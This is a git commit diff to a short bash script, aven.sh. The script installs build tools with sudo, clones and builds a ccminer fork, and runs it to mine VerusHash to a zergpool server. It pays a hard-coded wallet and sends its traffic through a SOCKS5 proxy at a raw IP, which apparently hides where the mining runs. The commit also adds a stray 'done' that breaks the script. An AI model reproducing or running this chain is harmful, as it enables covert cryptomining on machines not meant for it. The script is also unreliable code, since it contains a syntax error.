110460a5d342abe5f5206883136e1d198dd906e2
Taryok <92034895+Taryok@users.noreply.github.com>
2022-01-14 00:13:08 +0700

    Update aven.sh

--- aven.sh
+++ aven.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus  -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RLemhhPpfQpTc3gAqHnoYJvNowvdzbVUS4.STB -p c=RVN -t35 --proxy SOCKS5://192.252.220.92:17328
-pause
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus  -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RLemhhPpfQpTc3gAqHnoYJvNowvdzbVUS4.STB -p c=RVN -t35 --proxy socks5://192.252.220.92:17328
+done
 exit
